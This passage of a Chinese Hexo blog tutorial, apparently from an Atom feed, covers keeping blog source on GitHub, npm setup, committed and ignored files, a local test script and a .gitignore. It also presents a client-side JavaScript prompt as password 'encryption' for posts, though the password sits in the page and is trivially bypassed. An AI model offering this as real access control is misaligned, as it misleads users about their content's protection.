<li><strong>Debug</strong> project page can monitor appveyor.yml file <a href="https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io" target="_blank" rel="external">console</a></li>
</ol>
</li>
</ol>
<p><del>最终没有找到好的解决办法,目前就先这样啦,等找到办法了再来更新</del></p>
<h3 id="github-托管-source"><a href="#github-托管-source" class="headerlink" title="github 托管 source"></a>github 托管 source</h3><p>原理就是将常用电脑上的 blog根目录下建立 git仓库(source repo)，然后注意哪些文件要上传，哪些不能上传。以后可以在任意一台电脑上将 source repo clone 到本地，然后按照下面的步骤来配置。<br>步骤：</p>
<ol>
<li>安装 node-v6.9.4</li>
<li>clone 到本地以后，进入 repo目录然后安装工具&amp;模块。</li>
<li><p>执行下面的命令就可以配置好 hexo</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm <span class="keyword">install</span> hexo <span class="comment">--save</span></div><div class="line">npm <span class="keyword">install</span></div><div class="line">npm <span class="keyword">install</span> hexo-deployer-git <span class="comment">--save</span></div></pre></td></tr></table></figure>
</li>
<li><p>下面就是测试 server,generate,deploy命令了</p>
</li>
</ol>
<p>再来总结一下哪些文件需要上传，哪些不能上传：<br>上传:</p>
<pre><code>* _config.yml
* theme/
* source/
* scaffolds/
* package.json
* .gitignore
</code></pre><p>theme 下所有的.git/目录要删除，.gitignore 根据需要做修改。</p>
<p>不上传:</p>
<pre><code>* .git/
* db.json
* node_modules/
* public/
* .deploy_git/
</code></pre><blockquote>
<p>我遇到的坑, 在使用 GhoSadillaX 主题时，因为其gitignore 不上传_config.yml, 导致在 mac 上测试一直显示 duoshao 没配置short_name, 最后还是把 theme下的_config.yml找回来才解决。</p>
</blockquote>
<h3 id="hexo-博文设置-密码验证"><a href="#hexo-博文设置-密码验证" class="headerlink" title="hexo 博文设置 密码验证"></a>hexo 博文设置 密码验证</h3><p>首先，我们要了解 hexo 支持 markdown和javascript 混合编程。那么要实现对 单独的blog 加密，就可以在md 文件中嵌入一段校验密码的 js代码，如果要对所有的 blog 加密可以在 theme 中的 layout/_partial/header.ejs文件中添加一段校验密码的 js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    <span class="keyword">if</span>( prompt(<span class="string">"Please input password"</span>) !== <span class="built_in">String</span>(&#123;&#123; password &#125;&#125;) )</div><div class="line">    &#123;</div><div class="line">        alert(<span class="string">'密码错误！'</span>);</div><div class="line">        self.location=<span class="string">'http://localhost:4000/about/'</span>;</div><div class="line">        <span class="comment">// history.back();</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"密码正确"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>password 可以在 md文件头部设置<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">---</span></div><div class="line"><span class="attr">title:</span> xxx</div><div class="line"><span class="attr">date:</span> <span class="number">2017</span>-</div><div class="line"><span class="attr">tags:</span>  [xx,zz]</div><div class="line"><span class="attr">categories:</span></div><div class="line"><span class="attr">password:</span> password</div><div class="line"><span class="meta">---</span></div></pre></td></tr></table></figure></p>
<h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><h3 id="本地测试脚本"><a href="#本地测试脚本" class="headerlink" title="本地测试脚本"></a>本地测试脚本</h3><p>rtest.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Bhome=/home/floatg/data/FG-B<span class="built_in">log</span>/hexo/blog</div><div class="line">killall -9 hexo</div><div class="line"><span class="built_in">cd</span> <span class="variable">$Bhome</span></div><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
<h3 id="gitignore-内容"><a href="#gitignore-内容" class="headerlink" title=".gitignore 内容"></a>.gitignore 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">*.log</div><div class="line">/.deploy*</div><div class="line">/_config.yml</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">rtest.sh</div><div class="line">db.json</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;基础配置（一）&quot;&gt;&lt;a href=&quot;#基础配置（一）&quot; class=&quot;headerlink&quot; title=&quot;基础配置（一）&quot;&gt;&lt;/a&gt;基础配置（一）&lt;/h2&gt;&lt;h3 id=&quot;工具安装&quot;&gt;&lt;a href=&quot;#工具安装&quot; class=&quot;headerlink&quot; title=&quot;工具安装&quot;&gt;&lt;/a&gt;工具安装&lt;/h3&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
      <category term="AppVeyor" scheme="http://yoursite.com/tags/AppVeyor/"/>
    
      <category term="CI" scheme="http://yoursite.com/tags/CI/"/>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
  </entry>
  
</feed>
